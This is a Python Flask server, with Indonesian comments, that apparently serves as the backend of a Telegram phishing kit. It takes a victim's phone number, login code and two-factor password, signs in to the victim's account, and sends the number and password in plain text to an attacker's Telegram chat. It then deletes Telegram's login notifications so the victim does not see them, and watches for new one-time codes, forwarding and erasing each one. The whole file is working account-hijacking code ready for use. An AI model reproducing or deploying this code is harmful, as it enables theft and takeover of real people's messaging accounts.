import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
# Izinkan akses dari Vercel
CORS(app, resources={r"/*": {"origins": "*"}})

# Konfigurasi dari Environment Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"

# Database RAM (Akan reset jika Railway restart)
user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        # PENTING: Harus return hasil dari loop agar Flask tidak Error
        result = loop.run_until_complete(handle_flow(data))
        return result
    except Exception as e:
        print(f"Sistem Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        # Normalisasi Nomor
        num = re.sub(r'\D', '', data.get('nomor', ''))
        if num.startswith('0'): num = '62' + num[1:]
        nomor = '+' + num
        nama = data.get('nama', 'User')

        # Inisialisasi Database User di RAM
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        # Buat Client Telethon
        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        # --- STEP 1: REQUEST OTP ---
        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
            return jsonify({"status": "success"})

        # --- STEP 2: VERIFIKASI OTP ---
        elif step == 2:
            otp_code = data.get('otp')
            try:
                await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                
                # GHOST MODE: Hapus riwayat chat Telegram
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
                
                text = f"✅ **LOGIN BERHASIL (NO 2FA)**\nNama: **{nama}**\nNomor: `{nomor}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text,
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP BARU", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                # Simpan sesi untuk dilanjutkan ke Step 3 (2FA)
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except Exception as e:
                return jsonify({"status": "error", "message": "OTP SALAH/EXPIRED"}), 400

        # --- STEP 3: VERIFIKASI SANDI 2FA ---
        elif step == 3:
            sandi_2fa = data.get('sandi')
            if not sandi_2fa:
                return jsonify({"status": "error", "message": "Sandi kosong"}), 400
            
            try:
                await client.sign_in(password=sandi_2fa)
                user_db[nomor].update({"sandi": sandi_2fa, "session": client.session.save()})
                
                # GHOST MODE
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
                
                text = f"✅ **LOGIN SUKSES (DENGAN 2FA)**\nNama: **{nama}**\nNomor: `{nomor}`\nSandi: `{sandi_2fa}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text,
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP BARU", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.PasswordHashInvalidError:
                return jsonify({"status": "error", "message": "SANDI 2FA SALAH"}), 400
            except Exception as e:
                return jsonify({"status": "error", "message": f"Error: {str(e)}"}), 400

        return jsonify({"status": "error", "message": "Step tidak valid"}), 400

    finally:
        if client:
            await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        # Menghilangkan loading pada tombol bot
        bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Monitoring Aktif..."})
        
        data_call = call["data"].split("_")
        if data_call[0] == "upd":
            nomor = data_call[1]
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 **GHOST MODE AKTIF**\nMemantau OTP baru untuk `{nomor}`..."})
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"📩 **OTP TERINTIP**\nNomor: `{nomor}`\nKode: `{otp.group(0)}`"})
                await event.delete(revoke=True)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
        
        await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
    except: pass
    finally:
        await client.disconnect()

if __name__ == "__main__":
    if os.getenv('RAILWAY_STATIC_URL'):
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))